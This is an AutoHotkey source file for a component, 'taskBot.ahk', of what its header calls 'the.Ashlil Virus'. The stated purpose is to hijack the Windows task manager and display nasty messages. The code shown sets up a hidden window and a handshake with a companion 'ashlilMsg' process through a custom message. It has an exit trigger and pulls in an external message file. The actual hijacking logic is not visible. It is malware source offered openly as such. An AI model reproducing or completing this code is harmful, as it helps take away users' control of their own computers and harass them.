/*
	the.Ashlil Virus 
    // taskBot.ahk \\

  Author(s):-     pSych0 C0d3r		  &&       cyBer gHo$t     
  Contact:-  pSych0.c0d3r@gmail.com       gh0$t.(yber@gmail.com

  Description:- 
	Hijack the task manager and show nasty messages.
*/

#NoEnv  						;Recommended for performance.
#SingleInstance Ignore			;Make Single instance application.
; #NoTrayIcon						;Ensures that no icon is visible.
SetWorkingDir %A_ScriptDir%		;Ensures a consistent starting directory.
SendMode Input  				;Recommended due to its superior speed and reliability.

SetBatchLines -1				;For Speed

#Include Data\Message.ahk

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Code Begins

Gui 99: Show, Hide, taskbotMsg
OnMessage(0xBEEF, "rcvMsg")

hndShk("ashlilMsg")

; Random, Rnd, 1, 2
; Msgbox, 64, % taskManagerTitle%Rnd%, % taskManagerText%Rnd%

Return

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Misc.Labels()

rstrtAshlil:
	Msgbox, Ashlil Needs to be Restarted
Return

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Misc.Functions()

rcvMsg(msg)
{
	If (msg = 5051)
		ExitApp, 2
}

hndShk(withGui)
{
	SetTitleMatchMode, 3
	DetectHiddenWindows, On
	
	;Send a random number b/w 10,000 & 100,000
	Random, sentMessage, 10000, 100000	
	SendMessage, 0xBEEF, %sentMessage%,,, %withGui% ahk_class AutoHotkeyGUI
	
	rcvMessage := Errorlevel
	
	SetTitleMatchMode, 1
	DetectHiddenWindows, Off
	
	If (rcvMessage != sentMessage)
		SetTimer, rstrtAshlil, -500
	Else
		Msgbox, Ashlil is Running
}

